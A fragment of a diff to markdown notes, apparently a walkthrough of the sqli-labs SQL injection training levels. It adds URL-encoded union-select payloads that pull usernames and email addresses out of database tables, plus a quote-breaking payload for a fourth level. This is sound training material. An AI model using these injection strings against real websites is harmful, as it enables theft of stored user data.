@@ -21,4 +21,7 @@ __desc__
  
  *```Less-2/?id=%27-1%27%20union%20select%201,group_concat(username),3%20from%20users--+```
 we can find the data of column of the table by:
+
 *```Less-3/?id=l%27)union%20select%201,group_concat(id),group_concat(email_id)%20from%20emails--+```
+
+```/Less-4/?id=1")--+```
